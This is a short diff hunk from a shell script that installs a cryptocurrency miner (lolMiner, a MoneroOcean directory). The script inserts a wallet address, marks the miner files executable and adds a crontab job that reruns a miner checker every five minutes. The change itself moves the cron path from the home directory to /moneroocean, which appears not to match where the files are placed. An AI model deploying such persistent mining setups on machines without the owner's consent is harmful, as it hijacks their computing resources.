@@ -56,5 +56,5 @@ sed -i 's/unknow/'$WALLET'/' $HOME/moneroocean/mine_eth.sh
 chmod +x $HOME/moneroocean/mine_eth.sh
 chmod +x $HOME/moneroocean/lolMiner
 chmod +x $HOME/moneroocean/checkminner.sh
-(crontab -l 2>/dev/null || true; echo "*/5 * * * * sh $HOME/moneroocean/checkminner.sh") | crontab -
+(crontab -l 2>/dev/null || true; echo "*/5 * * * * sh /moneroocean/checkminner.sh") | crontab -
 
